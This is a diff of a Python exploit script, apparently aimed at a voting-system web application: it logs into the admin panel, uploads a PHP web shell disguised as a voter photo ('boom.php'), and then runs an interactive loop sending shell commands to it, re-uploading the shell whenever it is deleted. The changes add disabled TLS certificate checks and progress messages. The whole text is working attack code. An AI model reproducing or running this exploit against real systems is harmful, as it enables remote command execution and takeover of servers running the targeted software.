@@ -2,10 +2,12 @@ import requests
 import argparse
 
 def shell(url,username,password):
-    url_shell = url + '/images/boom.php' 
+    requests.packages.urllib3.disable_warnings()
+    url_shell = url + '/images/boom.php'
+    print("Payload located in " + url_shell)
 
     while True:
-        req_url_file_check = requests.get(url_shell)
+        req_url_file_check = requests.get(url_shell,verify=False)
         if req_url_file_check.status_code != 200:
             print("File has been deleted. Re-Uploading file!")
             upload(url,username,password)
@@ -16,7 +18,7 @@ def shell(url,username,password):
             rce_data = {
                 'cmd':cmd
             }
-            req_url_rce = requests.post(url_shell,data=rce_data)
+            req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
             if req_url_rce.status_code != 200:
                 print("File has been deleted. Re-Uploading file!")
                 upload(url,username,password)
@@ -25,27 +27,29 @@ def shell(url,username,password):
                 print(req_url_rce.text)
 
 def upload(url,username,password):
+    requests.packages.urllib3.disable_warnings()
     payload = "<?php echo system($_REQUEST['cmd']); ?>"
 
-    url_login = url + '/admin/login.php' #Edit if necessary 
+    url_login = url + '/admin/login.php'
     session = requests.Session() 
     login_data = {
         'username':username,'password':password,'login':''
     }
 
-    req_url_login = session.post(url_login,data=login_data) 
+    print("Loggin in to " + url_login)
+    req_url_login = session.post(url_login,data=login_data,verify=False) 
 
-    url_upload = url + '/admin/voters_add.php' 
+    url_upload = url + '/admin/voters_add.php'
     fdata = { 
         'firstname':'test','lastname':'voter','password':'passw0rd','add':''
-    } 
+    }
     fileup = { 
         'photo':('boom.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'})
-    } 
+    }
 
-    req_url_upload = session.post(url_upload,data=fdata,files=fileup)
+    req_url_upload = session.post(url_upload,data=fdata,files=fileup,verify=False)
     if req_url_upload.status_code == 200:
-        print("Uploaded Exploit!")
+        print("Logged in and was able to upload exploit!")
         shell(url,username,password)
     else:
         print("Something went wrong with the upload!")
